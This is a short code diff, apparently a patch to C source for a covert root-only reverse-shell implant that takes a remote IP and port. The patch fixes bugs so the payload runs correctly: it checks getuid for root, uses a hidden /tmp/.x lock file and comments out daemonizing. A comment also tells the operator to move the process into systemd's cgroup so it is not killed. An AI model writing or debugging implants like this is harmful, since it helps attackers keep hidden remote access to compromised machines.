@@ -42,9 +42,9 @@ void do_daemonize() {
 
 
 void _start(unsigned int reverse_ip, unsigned short reverse_port) {
-    char *buffer[0x100];
+    char buffer[0x100];
 
-    if (getpid() != 0) {
+    if (getuid() != 0) {
         return;
     }
 
@@ -55,7 +55,7 @@ void _start(unsigned int reverse_ip, unsigned short reverse_port) {
     }
 
     // return is /tmp/.x exist
-    if (open("/tmp/.x", O_CREAT | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXG)) {
+    if (open("/tmp/.x", O_CREAT | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXG) < 0) {
         return;
     }
 
@@ -65,7 +65,7 @@ void _start(unsigned int reverse_ip, unsigned short reverse_port) {
     }
 
 
-    do_daemonize();
+//    do_daemonize();
     // sometimes cgourp and systemd will kill our process
     // but not good to solve that here
     // run "echo $$ > /sys/fs/cgroup/systemd/tasks" as fast as you can
